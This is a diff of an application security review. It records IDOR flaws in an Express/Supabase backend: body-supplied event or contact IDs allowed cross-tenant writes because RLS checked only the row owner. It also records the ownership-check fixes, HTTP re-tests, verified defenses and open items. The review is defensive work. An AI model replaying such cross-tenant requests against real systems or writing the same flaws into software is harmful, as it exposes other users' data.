-> The event-name lookup in [captures.ts](backend/src/routes/captures.ts) now adds `.eq('user_id', req.user!.id)`. **But HTTP pen-testing revealed the name leak was the lesser problem:** `POST /captures` with a foreign `event_id` still *succeeded* (200) and created B's capture attached to A's event — RLS on `captures` only checks the new row's own `user_id`, not the foreign `event_id`. Added an explicit event-ownership precheck (403 if the caller doesn't own `event_id`). **Re-tested over HTTP as tenant B vs A: was 200 + cross-tenant capture created → now 403, no row created. Happy path (A on own event): 200.** Original below.
-
-- **Location:** `backend/src/routes/captures.ts:122-129`
-- **OWASP:** A01:2025 Broken Access Control
-- **Issue:** `event_id` is taken from the request body and used to fetch an event's `name` with no `user_id` filter on the service-role client. A user can resolve another tenant's event name by guessing its UUID.
-- **Impact:** Low — leaks only an event name. Worth scoping the lookup with `.eq('user_id', req.user!.id)`.
-
-#### [R-04] Cross-tenant foreign-key writes on event/contact link routes 🟠 High — ✅ **FIXED 2026-06-25 (HTTP pen-tested)** — NEW, found by class-sweep
-- **Discovered while sweeping the class** that R-02 belongs to: *a body-supplied foreign key inserted under RLS that only checks the new row's own `user_id`, never the foreign key.* Three routes were confirmed exploitable over HTTP (tenant B vs A), all returning 200 + a real cross-tenant row before the fix:
-  - `POST /contacts/:id/events` ([contacts.ts](backend/src/routes/contacts.ts)) — checked contact ownership but not the body `event_id`; B could link its contact to A's event (creates an `event_link` interaction referencing A's event).
-  - `POST /events/:id/contacts` and `POST /events/:id/targets/:targetId/contacts` ([events.ts](backend/src/routes/events.ts)) — `:id` event is param-guarded, but the body `contact_id` was unchecked; B could insert A's contact into B's `contact_events`.
-- **Root cause:** identical to R-02 and the original B5 — RLS `WITH CHECK (user_id = auth.uid())` validates the *row's* owner, not foreign references. Read-scoping ≠ write protection, and per-row RLS ≠ foreign-key authorization.
-- **Fix:** explicit ownership precheck of the body-supplied foreign key (event_id / contact_id) before each insert; 403 otherwise.
-- **Re-tested over HTTP:** all three → 403, no cross-tenant row; happy paths (own contact ↔ own event, both routes) → 200.
-- **Siblings checked & found already-safe:** `documents.ts` and `attachments.ts` POST already guard the body `contact_id` via `ownsContact`. `assistant.ts` inserts run as admin but set `user_id` from the server session and the agent path has its own ownership checks (per prior review).
-
-### Retraction / correction
-
-#### [R-03] events.ts `:id` sub-routes are NOT vulnerable — prior concern withdrawn 🟢
-- During this pass the many `event_id = req.params.id` queries in `events.ts` (`/:id/stats`, `/:id/targets`, `/:id/live`, `/:id/goals*`, `/:id/targets/import`, etc.) initially looked like IDOR because they use the service-role client without an inline `user_id` filter.
-- **They are protected** by `router.param('id', …)` at `events.ts:69`, which runs before every `:id` route and returns 403 unless `event.user_id === req.user.id`. Confirmed by reading the guard. This matches the prior note that `events.ts` is "guarded by `router.param`."
-
-### Areas reviewed and found OK (defense verified)
-
-- **Auth middleware** (`requireAuth.ts`) — validates Bearer token via `supabaseAuth.auth.getUser()`; sound. `routes/index.ts` applies it to all non-auth routes.
-- **Two-client split** (`supabaseClients.ts`) — admin (service-role) vs auth (anon) separation is correct; auth ops never run `.from()` on the admin client.
-- **Assistant agent** (`assistant.ts`) — write tools (`execCreateContact/UpdateContact/Event/DraftEmail`) all enforce `user_id` ownership; immutable-field stripping (`stripImmutable`) prevents LLM mass-assignment of `user_id`/`id`. Read path goes through Slayer.
-- **Slayer client** (`slayer-client.ts`) — model allowlist, Zod shape validation, `user_id` ownership + `deleted_at` injection, hallucinated `user_id` filters stripped; Slayer connects read-only with RLS as second check. `userId` is a server-validated UUID (no injection into the concatenated `user_id = '…'` filter). Solid defense-in-depth.
-- **Conversations/messages** (`conversations.ts`) — uses `createSupabaseUserClient` (RLS-enforced), not the admin client. Safe.
-- **Secrets** — `.env`, `backend/.env`, `backend/src/.env` are **not** git-tracked (gitignored). Request logger redacts `password`/`token`/`refresh_token`. No service-role key in the Flutter client (`supabase_config.dart` uses anon key from `String.fromEnvironment`).
-- **Firebase apiKeys** in `exono/lib/firebase_options.dart` are public client identifiers, not secrets — not a finding (harden via Firebase Security Rules + API-key restrictions instead, per prior C6).
-- **Service URLs** (Tavily, LiteLLM/Gemini, Slayer) are constants or env-sourced — no user-controlled outbound URL, so no SSRF in these paths.
-- **CORS/helmet** — `helmet()` enabled; CORS uses an allowlist (`ALLOWED_ORIGINS`) but allows no-origin requests (mobile/curl) by design.
-
-### Outstanding (not re-verified this pass)
-- SSRF in `enrichment-service.ts` / company `website` fetches (if any server-side fetch of user-supplied URLs exists).
-- `npm audit` dependency triage.
-- CSV formula-injection on import/export.
+- **B2 — DB-level exploit done; HTTP replay still recommended.** B2 was live-exploited at the DB layer (service_role-equivalent UPDATE landed on a non-owned company). Replaying it over a real `PATCH /api/companies/:id` HTTP call with User B's JWT would close the loop end-to-end, and the same call must return 403 after the fix.
+- **Firebase Security Rules + Google Cloud API-key restrictions** (C6) — not inspectable from this repo; verify in the Firebase/GCP console.
+- **Web headers on a live Firebase deploy** (H1 residual) — verify with `curl -I` against the deployed origin.
+- **`exceljs` import/extraction path** — confirm it applies the same formula guard as `/export/csv` (H2 was CSV-only) and that dropping `xlsx` doesn't regress parsing.
+- **Rate-limiter fail-open** — both limiters fail open on DB error; confirm that's acceptable for the auth/abuse threat model or add a circuit breaker.
